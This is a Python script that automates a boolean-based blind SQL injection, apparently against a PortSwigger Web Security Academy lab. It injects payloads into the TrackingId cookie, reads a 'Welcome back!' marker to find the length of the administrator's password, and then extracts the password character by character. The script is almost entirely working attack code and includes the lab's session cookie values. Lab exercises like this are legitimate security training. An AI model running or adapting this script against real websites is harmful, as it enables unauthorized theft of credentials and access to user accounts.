import requests

url = "https://0a19004c041532e284fd901b00a20090.web-security-academy.net/"

base_tracking_id = "6AI3KMDxPt4Ev26R"
session_cookie = "RfEVxzKZpuUiVSGWFO7GJCYy2DGANQbJ"

def get_length():
    for i in range(1, 50):
        payload = f"' AND length((SELECT password FROM users WHERE username='administrator'))={i}--"
        
        cookies = {
            "TrackingId": base_tracking_id + payload,
            "session": session_cookie
        }

        r = requests.get(url, cookies=cookies)

        if "Welcome back!" in r.text:
            return i

    return None

charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}:;,.?"

def get_password(length):
    password=""
    for i in range(1, length+1):
        for char in charlist:
            payload = f"' and substring((select password from users where username ='administrator'),{i},1)='{char}'--"
            
            cookies={
                "TrackingId":base_tracking_id+payload,
                "session":session_cookie
            }
            response = requests.get(url, cookies=cookies)
            if "Welcome back!" in response.text:
                password=password+char
                print(f"[*]trying--->{password}....")
                break
            
    return password


length = get_length()
print(f"[+] Password length = {length}")

if(length):
    password = get_password(length=length)
    print(f"[+]the password: {password}")

